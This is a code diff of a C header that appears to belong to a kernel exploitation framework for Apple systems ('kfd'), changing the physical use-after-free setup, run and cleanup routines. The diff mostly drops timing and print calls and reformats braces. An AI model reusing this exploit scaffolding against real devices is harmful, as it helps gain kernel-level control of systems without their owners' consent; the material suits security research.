@@ -16,7 +16,6 @@ void puaf_helper_give_ppl_pages(void);
 #define puaf_method_case(method)                                 \
     case puaf_##method: {                                        \
         const char* method_name = #method;                       \
-        print_string(method_name);                               \
         kfd->puaf.puaf_method_ops.init = method##_init;          \
         kfd->puaf.puaf_method_ops.run = method##_run;            \
         kfd->puaf.puaf_method_ops.cleanup = method##_cleanup;    \
@@ -24,8 +23,7 @@ void puaf_helper_give_ppl_pages(void);
         break;                                                   \
     }
 
-void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method)
-{
+void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method) {
     kfd->puaf.number_of_puaf_pages = puaf_pages;
     kfd->puaf.puaf_pages_uaddr = (u64*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(u64)));
 
@@ -37,17 +35,12 @@ void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method)
     kfd->puaf.puaf_method_ops.init(kfd);
 }
 
-void puaf_run(struct kfd* kfd)
-{
+void puaf_run(struct kfd* kfd) {
     puaf_helper_give_ppl_pages();
-
-    timer_start();
     kfd->puaf.puaf_method_ops.run(kfd);
-    timer_end();
 }
 
-void puaf_cleanup(struct kfd* kfd)
-{
+void puaf_cleanup(struct kfd* kfd) {
     timer_start();
     kfd->puaf.puaf_method_ops.cleanup(kfd);
     timer_end();
@@ -68,8 +61,7 @@ void puaf_free(struct kfd* kfd)
  * Helper puaf functions.
  */
 
-void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out)
-{
+void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out) {
     u64 first_address = 0;
     u64 last_address = 0;
 
@@ -101,8 +93,7 @@ void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out)
     *last_out = last_address;
 }
 
-void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out)
-{
+void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out) {
     task_vm_info_data_t data = {};
     task_info_t info = (task_info_t)(&data);
     mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
@@ -112,10 +103,7 @@ void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out)
     *max_out = data.max_address;
 }
 
-void puaf_helper_give_ppl_pages(void)
-{
-    timer_start();
-
+void puaf_helper_give_ppl_pages(void) {
     const u64 given_ppl_pages_max = 10000;
     const u64 l2_block_size = (1ull << 25);
 
@@ -151,7 +139,6 @@ void puaf_helper_give_ppl_pages(void)
     }
 
     print_u64(given_ppl_pages);
-    timer_end();
 }
 
 #endif /* puaf_h */
